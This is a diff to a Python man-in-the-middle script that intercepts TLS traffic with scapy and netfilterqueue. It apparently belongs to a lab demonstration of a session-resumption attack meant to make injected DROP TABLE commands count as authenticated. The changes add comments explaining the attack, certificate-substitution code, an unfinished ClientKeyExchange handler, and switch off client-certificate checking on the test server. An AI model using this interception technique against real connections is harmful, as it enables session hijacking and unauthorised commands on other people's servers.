@@ -19,6 +19,19 @@ from scapy.sendrecv import send
 from scapy.utils import hexdump
 from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker
 
+# We got a server and a client. The server accepts "database" commands from clients: if they are select commands, it accepts
+# them because they are innocuous, but if they are DROP TABLE commands, it requests a certificate from the client before executing them.
+#
+# the attack premises are that the client speaks to us "voluntarily", in the sense that it accepts our certificate in some way
+# (we could've stolen it from a legitimate server).
+#
+# The objective is to negotiate the same session ID and same master key (Which are parameters used in the session resumption handshake)
+# so that we (as the attacker) can send unauthenticated data to the server,
+# truncate the connection when  the server asks for client auth, and then, when the client and server
+# resume the session, they will resume the session through the resume session handshake (which is vulnerable because it's not tied
+# to the previous messages) and since we made them negotiate the same parameters, the handshake will complete (this time with the
+# real client signing the finished messages!) and our previously unauthenticated sent data will be instead treated as authenticated
+# (mind you, the client doesn't even know we sent that!).
 
 TLS_VERSION = (3,2) # 3,2 For tls 1.1, 3,3 for tls 1.2, 3,4 for tls 1.3 (watchout, you might need ecdsa, might not work with rsa... it gives missing supported group error...)
 
@@ -91,6 +104,8 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             print("n_tls_records: " + str(n_tls_records))
 
             # check each one
+            # remember, for TLS 1.1 It is not legal to send the server key echange message for the RSA method (RFC 4346 page 42), so
+            # we don't have to deal with it!
             for i in range(1, n_tls_records + 1):
                 generic_tls_layer = scpy_pkt.getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
                                                                     # which has a type, a version, a len and an iv field...
@@ -113,7 +128,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
                     server_certificate_der = open("/app/server_certificate.der", "rb").read()
                     server_certificate_der_len = len(server_certificate_der)
-                    #todo: what if negative difference? Then the only way is to actively modify seq fields!
+                    #todo: what if negative difference? Then the only way is to actively modify seq fields (or make a shorter certificate by leaving some field empty, like country, state... but not common name)!
                     attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
                     attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)
 
@@ -143,6 +158,23 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
             print(len(bytes(scpy_pkt)))
             pkt.set_payload(bytes(scpy_pkt))
+
+        elif scpy_pkt.haslayer(scapy.layers.tls.handshake.TLSClientKeyExchange):
+            # third message, got to modify the encrypted pre-master secret with the public key of the server
+            # remember: the previous message modified the packet and sent the attacker's certificate, so what we receive
+            # is encrypted with the attacker's public key!
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+            print("TLS client key exchange captured")
+            scpy_pkt.show2()
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+            print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
+
+            # how many TLS records are stacked in this message?
+            n_tls_records = len(scpy_pkt["TCP"].layers()) - 1  # don't count TCP layer...
+            print("n_tls_records: " + str(n_tls_records))
 
         pkt.accept()
     else:
@@ -276,8 +308,8 @@ if __name__ == '__main__':
                                  privateKey=private_key,
                                  settings=settings,
                                  sessionCache=sessionCache,
-                                 checker=Checker(client_certificate.getFingerprint()),
-                                 reqCert=True)  # we pass the server certificate and private key to the function
+                                 #checker=Checker(client_certificate.getFingerprint()),
+                                 reqCert=False)  # we pass the server certificate and private key to the function
             print("Handshake done")
 
             msg = conn.recv(1024)
